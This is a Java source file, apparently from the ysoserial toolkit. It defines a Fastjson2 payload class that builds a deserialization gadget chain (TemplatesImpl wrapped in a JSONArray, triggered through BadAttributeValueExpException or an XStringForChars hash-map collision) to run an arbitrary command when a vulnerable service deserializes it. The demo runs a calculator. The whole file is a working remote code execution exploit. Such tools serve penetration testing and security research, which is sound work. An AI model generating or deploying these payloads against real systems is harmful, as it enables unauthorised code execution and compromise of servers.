package ysoserial.payloads;

import com.alibaba.fastjson2.JSONArray;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.ArrayList;
import java.util.HashMap;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.alibaba:fastjson:2.x"})
@Authors({Authors.Y4ER})
public class Fastjson2 implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Fastjson2.class, new String[]{"open -a Calculator_xString"});
    }

    public Object getObject(final String command) throws Exception {

        Boolean xs = false;
        String cmd = "";
        if (command.contains("_")) {
            String[] s = command.split("_");
            cmd = s[0];
            if (s[1].equals("xString")) {
                xs =true;
            }
        }else {
            cmd = command;
        }
        final Object template = Gadgets.createTemplatesImpl(cmd);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        if (xs) {
            Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
            Object xString = Reflections.createWithoutConstructor(aClass1);
            Reflections.setFieldValue(xString, "m_obj", new char[]{});
            HashMap hashMap1 = new HashMap();
            HashMap hashMap2 = new HashMap();
            hashMap1.put("zZ", xString);
            hashMap1.put("yy", jsonArray);
            hashMap2.put("yy", xString);
            hashMap2.put("zZ", jsonArray);
            HashMap map = Gadgets.makeMap(hashMap1, hashMap2);
            ArrayList<Object> arrayList = new ArrayList<>();
            arrayList.add(template);
            arrayList.add(map);
            return arrayList;
        }else {
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);
            HashMap hashMap = new HashMap();
            hashMap.put(template, badAttributeValueExpException);

            return hashMap;
        }
    }
}
